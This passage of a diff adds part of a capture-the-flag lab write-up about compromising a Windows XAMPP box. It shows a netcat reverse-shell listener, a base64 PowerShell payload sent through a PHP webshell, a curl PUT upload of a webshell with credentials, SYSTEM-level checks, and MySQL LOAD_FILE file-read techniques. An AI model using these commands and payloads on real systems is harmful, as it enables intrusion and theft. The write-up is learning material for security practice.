+Prerequisite — the listener has to exist before the payload runs, since the payload connects outward immediately on execution with no retry logic shown:
+
+```text
+nc -lvnp 4444
+```
+
+A delivery gotcha worth remembering: passing this payload through the webshell's c URL parameter means it has to survive being embedded in a URL query string. Base64 output routinely contains +, /, and = characters, all of which have specific reserved meanings inside a URL (+ often means a literal space in query strings, = separates keys from values, / is a path separator) — pasting the raw base64 into a browser address bar or an unescaped URL will corrupt it before it ever reaches the server.
+
+The actual working request used percent-encoding for the space between powershell and -e:
+
+```text
+http://10.129.78.187/test2.php?c=powershell%20-e%20<base64-blob>
+```
+
+This succeeded and produced a persistent, interactive-feeling session — confirmed by the fact that the returned prompt (PS C:\xampp\htdocs>) stuck around across multiple subsequent commands rather than appearing once and disappearing, which is what you'd expect from the loop structure seen in the decoded payload above.
+
+## Phase 6 — Post-Exploitation: Confirming Privilege Level
+
+```text
+whoami
+```
+
+Returned nt authority\system — full SYSTEM privileges, the highest local privilege level on Windows.
+
+```text
+whoami /priv
+```
+
+Returned a full privilege listing, notably with SeDebugPrivilege, SeImpersonatePrivilege, and SeTcbPrivilege all set to Enabled — consistent with genuine SYSTEM-level access rather than a restricted service account impersonating it.
+
+Worth noting for the notebook: XAMPP on Windows is frequently installed and run with its Apache service configured under the SYSTEM account (rather than a dedicated, lower-privileged service account), which is a well-known misconfiguration pattern. It means that getting code execution through the web application at all — via the webshell — immediately hands you SYSTEM, with no separate privilege-escalation phase required. That won't be true on every box, but it's common enough with default XAMPP installs to be worth checking for early.
+
+## Phase 7 — Locating and Retrieving the Flag
+
+The known path from initial recon was C:\Users\Administrator\Desktop\flag.txt, retrieved directly through the interactive shell established above.
+
+For situations where the exact path isn't already known, the general-purpose version of this search:
+
+```powershell
+Get-ChildItem -Recurse -Path C:\ -Include *flag* -File -ErrorAction SilentlyContinue
+```
+
+or, when only matching a single pattern (this is provider-native filtering and generally faster than -Include):
+
+```powershell
+Get-ChildItem -Path C:\ -Recurse -Filter *flag* -File -ErrorAction SilentlyContinue
+```
+
+-ErrorAction SilentlyContinue is worth always including on a full-drive recursive search — even under SYSTEM, Windows has certain self-referential junction points and reparse points (like the legacy Documents and Settings compatibility link) that throw access errors during recursion and clutter the output otherwise.
+
+## Mistake #3 — Repeating Mistake #1 With a Second Webshell
+
+Later in the session, a more fully-featured PHP webshell (WhiteWinterWolf's wwwolf-php-webshell) was uploaded using the exact same CoreFTP PUT technique from Phase 1 / Mistake #1:
+
+```text
+curl -k -X PUT -H "Host: http://10.129.78.187" --basic -u fiona:987654321 --data-binary @/home/WhiteWinterWolf/wwwolf-php-webshell/webshell.php --path-as-is https://10.129.78.187/webshell.php
+```
+
+This returned HTTP/1.1 200 Ok — the write succeeded. But navigating to https://10.129.78.187/webshell.php in a browser just triggered a file download instead of rendering or executing anything. This is exactly the same root cause as Mistake #1: the PUT request went to CoreFTP's own built-in HTTP server (again identifiable via the earlier-seen Server: Core FTP HTTP Server and Content-type: application/octet-stream headers), which has no PHP interpreter behind it and can only ever serve raw bytes.
+
+The correct fix, and the one actually applied: since a fully working SYSTEM shell already existed via test2.php at this point, there was no need to fight the CoreFTP PUT route for this second webshell at all. The existing shell could simply be used to place the file directly into C:\xampp\htdocs\ instead — for example, hosting the file from the attacker box with python3 -m http.server, then pulling it down from inside the target's PowerShell session with Invoke-WebRequest.
+
+Once code execution exists through any path, that path becomes the easiest way to deliver everything else, rather than continuing to route new files through a vulnerability that was never going to execute them in the first place.
+
+## Reference — LOAD_FILE() for File Reads (Discussed, Not Needed on This Box)
+
+Since command execution was already achieved by this point, this wasn't actually needed to solve the box — but it's a core technique worth having fully documented for future engagements where SQL access (or an LFI) is the only foothold available, with no RCE yet.
+
+Direct form, when the target path is already known:
+
+```sql
+SELECT LOAD_FILE('C:\\Users\\Administrator\\Desktop\\flag.txt');
+```
+
+Discovery form, used when the absolute path isn't known in advance:
+
+```sql
+SELECT LOAD_FILE(CONCAT(@@basedir, 'Path_to_the_flag\flag.txt'));
+```
+
+@@basedir is a MySQL/MariaDB system variable holding the database software's own installation directory (e.g., C:\xampp\mysql\ on a XAMPP install). Since you always know this value with certainty once connected, it functions as a confirmed anchor point — a real, verified path you can build guesses or traversal off of, rather than blindly guessing an entire absolute path from nothing.
+
+The same two prerequisite checks from Phase 3 apply here (FILE privilege, secure_file_priv), plus one extra wrinkle specific to reads: the target file also has to be OS-readable by whichever account the MySQL/MariaDB service itself runs as — not the database user you're logged in as. If the service account can't read the file (say, it's ACL'd to Administrator only), LOAD_FILE just silently returns NULL, even with correct SQL-level privileges and no secure_file_priv restriction blocking the path.
+
+General methodology for blind file discovery, when you have a file-read primitive but don't know the layout: fingerprint the OS and version first (SELECT @@version_compile_os;, SELECT @@version;), since that narrows down which default paths are worth trying.
+
+Lean on well-known default install locations — C:\xampp\, C:\wamp64\www\, C:\inetpub\wwwroot\ on Windows; /var/www/html/, /etc/ on Linux.
+
+Use a small, guaranteed-to-exist file as an initial probe to confirm read access works at all before worrying about anything specific — C:\Windows\win.ini on Windows, /etc/passwd on Linux, are both classic choices.
+
+Remember that LOAD_FILE() cannot list directory contents — it can only read an exact filename you already have — so for user-specific paths like C:\Users\&lt;name>\Desktop\, the username has to come from somewhere else entirely (SMB enumeration, RID cycling, earlier recon, or just trying very common defaults like Administrator).
+
+And prefer combining multiple recon channels over pure blind guessing — verbose error messages, stack traces, exposed .git directories, and misconfigured directory listings frequently leak full server paths for free.
+
+Finally: the moment actual command execution is available, this entire blind-guessing approach becomes unnecessary — direct directory listing (dir / Get-ChildItem) is strictly faster and more reliable than reading one guessed file at a time through SQL.
+
+### Full Mistake Recap
+
+Mistake 1 (made twice): treated a successful file write via CoreFTP's PUT vulnerability as equivalent to code execution. It isn't — that PUT lands in CoreFTP's own server root, which has no PHP interpreter and only ever serves raw bytes. Happened first with the initial shell.php, and again later with the WhiteWinterWolf webshell. Root cause both times: confusing "the file was written successfully" with "the file will be executed."
+
+Mistake 2: misread a local curl error (Failed to open shell.php, caused by --data-binary @shell.php looking for a local file that wasn't in the current directory) as a server-side or network problem, when it had nothing to do with the target at all.
+
+Mistake 3 (terminology): referred to direct, authenticated MySQL/MariaDB client access — using valid, cracked credentials — as "SQL injection." That term specifically describes exploiting a vulnerable web application's own query construction; this was just a database login, no web app or injection involved.
+
+## Medium was easier.
 
 it was ftp hiding on 30021 and it allowed anonymous access where I found .txtfile with credentials. after that I brute forced ftp on port 2121 for user simon and found credentials. there I found flag.
-
-
 
 ---
 
